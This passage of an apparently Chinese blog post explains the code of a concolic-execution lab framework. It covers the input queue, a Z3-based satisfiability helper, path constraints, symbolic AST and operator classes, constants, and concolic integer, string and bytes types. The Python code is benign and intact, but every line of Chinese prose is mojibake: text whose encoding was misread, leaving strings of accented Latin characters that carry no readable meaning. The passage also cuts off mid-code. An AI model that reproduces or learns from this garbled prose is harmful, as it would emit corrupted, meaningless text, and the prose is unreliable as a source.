<p>æ··åˆæ‰§è¡Œæ¡†æ¶åœ¨ä¸€ä¸ª <code>InputQueue</code> å¯¹è±¡ä¸­ç»´æŒä¸€ä¸ªå¾…å°è¯•çš„ä¸åŒè¾“å…¥çš„é˜Ÿåˆ—ï¼Œæ¡†æ¶é¦–å…ˆä¼šæ·»åŠ ä¸€ä¸ªåˆå§‹è¾“å…¥ï¼ˆç©ºå­—å…¸ <code>&#123;&#125;</code>ï¼‰ï¼Œä¹‹åæ‰§è¡Œä»£ç ï¼Œè‹¥åº”ç”¨è¿›å…¥äº†åˆ†æ”¯ï¼Œæ··åˆæ‰§è¡Œç³»ç»Ÿå°†å”¤é†’ Z3 æ¥å¸¦æ¥ æ–°çš„è¾“å…¥ä»¥æµ‹è¯•ä»£ç ä¸­çš„å…¶ä»–åˆ†æ”¯ï¼Œå°†è¿™äº›è¾“å…¥æ”¾åˆ°è¾“å…¥é˜Ÿåˆ—ä¸­ï¼Œå¹¶ä¿æŒè¿­ä»£ç›´åˆ°æ²¡æœ‰è¾“å…¥å¯ä»¥å°è¯•</p>
</li>
<li><p><strong>å¯æ»¡è¶³æ€§æ¨¡ç†è®ºæ±‚è§£å™¨</strong>ï¼ˆThe SMT solverï¼‰ï¼š <code>fork_and_check(c)</code> å‡½æ•°ä¼šæ£€æŸ¥çº¦æŸ <code>c</code> ï¼ˆä¸€ä¸ª AST èŠ‚ç‚¹ï¼‰æ˜¯å¦ä¸ºå¯æ»¡è¶³çš„è¡¨è¾¾å¼ï¼Œå¹¶è¿”å›ä¸€å¯¹å€¼ï¼šå¯æ»¡è¶³æ€§çŠ¶æ€ <code>ok</code> åŠç¤ºä¾‹æ¨¡å‹ï¼ˆåˆ†é…ç»™å˜é‡çš„å€¼ï¼‰ï¼Œè‹¥çº¦æŸå¯ä»¥è¢«æ»¡è¶³åˆ™ <code>ok</code> ä¸º <code>z3.sat</code> ï¼Œè‹¥çº¦æŸä¸å¯è¢«æ»¡è¶³åˆ™ <code>ok</code> ä¸º <code>z3.unsat</code> æˆ– <code>z3.unknown</code>ï¼›è¯¥å‡½æ•°å†…éƒ¨ä¼š fork ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹æ¥è¿è¡Œ Z3 æ±‚è§£å™¨ï¼Œè‹¥è€—æ—¶è¶…è¿‡ <code>z3_timeout</code> åˆ™æ€æ­»è¿›ç¨‹å¹¶è¿”å› <code>z3.unknown</code></p>
</li>
<li><p><strong>å½“å‰è·¯å¾„æ¡ä»¶</strong>ï¼ˆThe current path conditionï¼‰ï¼šå½“åº”ç”¨æ‰§è¡Œå¹¶åŸºäºæ··åˆå€¼å†³å®šæ§åˆ¶æµæ—¶ï¼ˆå‚è§ä¸Šé¢å…³äº <code>concolic_bool</code> çš„è®¨è®ºï¼‰ï¼Œè¡¨ç¤ºè¯¥åˆ†æ”¯çš„çº¦æŸä¼šè¢«æ·»åŠ åˆ° <code>cur_path_constr</code> åˆ—è¡¨ä¸­ï¼Œä¸ºäº†ç”Ÿæˆèƒ½å¤Ÿæ²¿ç€ä¸€æ¡åˆ†æ”¯ä»ä¸€ä¸ªç‚¹è¿›è¡Œä¸åŒé€‰æ‹©çš„è¾“å…¥ï¼Œæ‰€éœ€çš„çº¦æŸä¸ºè·¯å¾„ä¸Šè¯¥ç‚¹ä¹‹å‰çš„çº¦æŸé›†åˆï¼ŒåŠ ä¸Šè¯¥ç‚¹çš„åå‘çº¦æŸï¼›ä¸ºäº†å¸®åŠ©è°ƒè¯•ä¸å¯å‘å¼æœç´¢ï¼Œè§¦å‘äº†åˆ†æ”¯çš„ä»£ç è¡Œçš„ä¿¡æ¯ä¼šè¢«å­˜æ”¾åœ¨ <code>cur_path_constr_callers</code> åˆ—è¡¨ä¸­</p>
</li>
</ul>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬çš„å·¥ä½œæ˜¯å®Œæˆå¯¹ <code>concolic_int</code> çš„å®ç°ï¼Œå¹¶å°†ä»£ç åº”ç”¨äºæ··åˆæ‰§è¡Œå¾ªç¯çš„æ ¸å¿ƒï¼Œæœ¬ Lab æä¾›äº†ä¸¤ä¸ªæµ‹è¯•ç¨‹åºï¼š <code>check-concolic-int.py</code> ä¸ <code>check-symex-int.py</code></p>
<h3 id="æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ-Part-1"><a href="#æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ-Part-1" class="headerlink" title="æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ  - Part 1"></a>æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ  - Part 1</h3><p>åœ¨åš Exercise ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹è¿™ä¸ªæ··åˆæ‰§è¡Œæ¡†æ¶çš„ä»£ç ç»“æ„ï¼Œå…¶æ ¸å¿ƒä»£ç ä¸»è¦ä½äº <code>symex/fuzzy.py</code> ä¸­</p>
<h4 id="I-AST-èŠ‚ç‚¹"><a href="#I-AST-èŠ‚ç‚¹" class="headerlink" title="I. AST èŠ‚ç‚¹"></a>I. AST èŠ‚ç‚¹</h4><p>é¦–å…ˆæ˜¯ AST èŠ‚ç‚¹ï¼Œä½œä¸ºæ‰€æœ‰ç¬¦å·ç±»çš„çˆ¶ç±»è€Œå­˜åœ¨ï¼Œå®šä¹‰æ¯”è¾ƒç®€å•ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_ast</span>(<span class="hljs-title class_ inherited__">object</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(self._z3expr())<br></code></pre></td></tr></table></figure>

<h4 id="II-ç¬¦å·è¿ç®—"><a href="#II-ç¬¦å·è¿ç®—" class="headerlink" title="II. ç¬¦å·è¿ç®—"></a>II. ç¬¦å·è¿ç®—</h4><p>ç„¶åæ˜¯ <code>sym_func_apply</code> ç±»ï¼Œä½œä¸ºæ‰€æœ‰ç¬¦å·æ“ä½œçš„çˆ¶èŠ‚ç‚¹ï¼Œè¿™é‡Œä¸»è¦é‡è½½äº† <code>__eq__()</code> å’Œ <code>__hash__()</code> æ–¹æ³•ï¼Œç”¨äºæ¯”è¾ƒä¸è®¡ç®—å“ˆå¸Œå€¼ï¼Œæ¯”è¾ƒçš„æ–¹æ³•å°±æ˜¯åˆ¤æ–­æ˜¯å¦æ‰€æœ‰å‚æ•°ç›¸ç­‰ï¼Œå“ˆå¸Œå€¼çš„è®¡ç®—åˆ™æ˜¯æ‰€æœ‰å‚æ•°çš„å“ˆå¸Œå€¼è¿›è¡Œå¼‚æˆ–ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_func_apply</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, *args</span>):<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> args:<br>      <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(a, sym_ast):<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Passing a non-AST node %s %s as argument to %s&quot;</span> % \<br>                        (a, <span class="hljs-built_in">type</span>(a), <span class="hljs-built_in">type</span>(self)))<br>    self.args = args<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(self) != <span class="hljs-built_in">type</span>(o):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.args) != <span class="hljs-built_in">len</span>(o.args):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(sa == oa <span class="hljs-keyword">for</span> (sa, oa) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.args, o.args))<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> functools.reduce(operator.xor, [<span class="hljs-built_in">hash</span>(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br></code></pre></td></tr></table></figure>

<p>ç„¶åæ˜¯ä¸‰ä¸ªç±» <code>sym_unop</code> ã€<code>sym_binop</code> ã€<code>sym_triop</code>ï¼Œè¡¨ç¤ºå¸¦æœ‰1ã€2ã€3ä¸ªæ“ä½œæ•°çš„å°è£…ï¼Œå¯ä»¥ä½¿ç”¨ <code>a</code> ã€<code>b</code> ã€<code>c</code> è·å¾—ç¬¬ 1ã€2ã€3ä¸ªæ“ä½œæ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_unop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a</span>):<br>    <span class="hljs-built_in">super</span>(sym_unop, self).__init__(a)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_binop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a, b</span>):<br>    <span class="hljs-built_in">super</span>(sym_binop, self).__init__(a, b)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_triop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a, b, c</span>):<br>    <span class="hljs-built_in">super</span>(sym_triop, self).__init__(a, b, c)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">1</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">c</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure>

<p>åŸºäº <code>sym_func_apply</code> ä¸ <code>op</code> ç±»ï¼Œå°è£…äº†ç›¸ç­‰æ¯”è¾ƒã€ä¸ã€æˆ–ã€éå››ä¸ªæ“ä½œï¼Œå…¶å®ç°åŸç†ä¸»è¦è¿˜æ˜¯è½¬æˆ Z3 è¡¨è¾¾å¼ååˆ©ç”¨ Z3 çš„ä¸æˆ–éè¿›è¡Œè¿ç®—ï¼šï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Logic expressions</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_eq</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) == z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_and</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.And(*[z3expr(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_or</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Or(*[z3expr(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_not</span>(<span class="hljs-title class_ inherited__">sym_unop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Not(z3expr(self.a))<br></code></pre></td></tr></table></figure>

<p>ç¬¦å·æ•°çš„åŠ å‡ä¹˜é™¤æ¯”è¾ƒç­‰æ“ä½œéƒ½æ˜¯åŸºäºä¸Šé¢å°è£…çš„ <code>op</code> ç±»å®Œæˆçš„ï¼š</p>
<blockquote>
<p>ä¹˜é™¤ç­‰è¿ç®—éœ€è¦æˆ‘ä»¬åœ¨åç»­çš„ Exercise ä¸­è‡ªè¡Œå®ç°</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_lt</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) &lt; z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_gt</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) &gt; z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_plus</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) + z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_minus</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) - z3expr(self.b)<br></code></pre></td></tr></table></figure>



<h4 id="III-å¸¸é‡"><a href="#III-å¸¸é‡" class="headerlink" title="III. å¸¸é‡"></a>III. å¸¸é‡</h4><p>å­—ç¬¦ä¸²å¸¸é‡ <code>const_str</code> ã€æ•´å‹å¸¸é‡ <code>const_int</code> ã€å¸ƒå°”å¸¸é‡ <code>const_bool</code> çš„å®ç°æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯ç»§æ‰¿è‡ª <code>sym_ast</code> å¹¶ä¸”å‚¨å­˜å¯¹åº”çš„å€¼ï¼Œå…¶ä¸­å­—ç¬¦ä¸²å¸¸é‡åœ¨è½¬ä¸º Z3 è¡¨è¾¾å¼æ—¶ä¼šè°ƒç”¨ <code>z3.StringVal()</code>ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_str</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, v</span>):<br>    self.v = v<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_str):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.v == o.v<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.v)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.StringVal(self.v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_int</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, i</span>):<br>    self.i = i<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_int):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.i == o.i<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.i)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.i<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_bool</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, b</span>):<br>    self.b = b<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_bool):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.b == o.b<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.b)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.b<br></code></pre></td></tr></table></figure>

<h4 id="IV-ç¬¦å·å˜é‡"><a href="#IV-ç¬¦å·å˜é‡" class="headerlink" title="IV. ç¬¦å·å˜é‡"></a>IV. ç¬¦å·å˜é‡</h4><p>åœ¨è¯¥æ¡†æ¶ä¸­å®šä¹‰äº†ä¸¤ç§ç±»å‹çš„ç¬¦å·å˜é‡ï¼š<code>sym_int</code> ä¸ <code>sym_str</code>ï¼Œéƒ½æ˜¯ç›´æ¥åŸºç¡€è‡ª AST èŠ‚ç‚¹ç±»ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Arithmetic</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_int</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span></span>):<br>    self.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, sym_int):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.<span class="hljs-built_in">id</span> == o.<span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.<span class="hljs-built_in">id</span>)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Int(self.<span class="hljs-built_in">id</span>)<br><br><span class="hljs-comment">###...</span><br><br><span class="hljs-comment">## String operations</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_str</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span></span>):<br>    self.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, sym_str):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.<span class="hljs-built_in">id</span> == o.<span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.<span class="hljs-built_in">id</span>)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Const(self.<span class="hljs-built_in">id</span>, z3.StringSort())<br></code></pre></td></tr></table></figure>

<h4 id="V-æ··åˆå˜é‡"><a href="#V-æ··åˆå˜é‡" class="headerlink" title="V. æ··åˆå˜é‡"></a>V. æ··åˆå˜é‡</h4><p>æ­£å¦‚å‰æ–‡æ‰€è¨€ï¼Œæˆ‘ä»¬å®é™…ä¸Šåœ¨æ··åˆæ‰§è¡Œå¼•æ“å½“ä¸­ä½¿ç”¨çš„ä¸ºæ··åˆå‹ï¼ˆconcolicï¼‰çš„å˜é‡æ¥å‚¨å­˜çº¦æŸå€¼ï¼Œæ¡†æ¶ä¸­æä¾›äº†ä¸‰ç§ç±»å‹çš„æ··åˆå˜é‡â€”â€”<code>concolic_int</code> ï¼ˆæ•´å‹ï¼‰ã€ <code>concolic_str</code>ï¼ˆå­—ç¬¦ä¸²ï¼‰ã€<code>concolic_bytes</code>ï¼ˆå­—ç¬¦æ•°ç»„ï¼‰ï¼Œå…¶ä¸­å…·ä½“å€¼ï¼ˆconctre valueï¼‰å­˜æ”¾åœ¨ <code>__v</code> æˆå‘˜ä¸­ï¼Œç¬¦å·å€¼ï¼ˆsymbolic valueï¼‰å­˜æ”¾åœ¨ <code>__sym</code> ä¸­</p>
<p>ä¸»è¦æ˜¯<strong>å¤§é‡çš„è¿ç®—ç¬¦é‡è½½</strong>ï¼Œè¿™é‡Œå°±ä¸è´´å®Œæ•´ä»£ç äº†ï¼Œå¯ä»¥è‡ªå·±å»çœ‹ï¼ˆç¬‘ï¼‰ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_int</span>(<span class="hljs-title class_ inherited__">int</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    self = <span class="hljs-built_in">super</span>(concolic_int, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">## ...</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_str</span>(<span class="hljs-title class_ inherited__">str</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">str</span><br>    self = <span class="hljs-built_in">super</span>(concolic_str, cls).__new__(cls, v)<br>    self.__v = v<br>    self.__sym = sym<br>    <span class="hljs-keyword">return</span> self<br><br><span class="hljs-comment">##...</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">concolic_bytes</span>(<span class="hljs-title class_ inherited__">bytes</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">cls, sym, v</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">bytes</span><br>    self = <span class="hljs-built_in">super</span>(concolic_bytes, cls).__new__(cls, 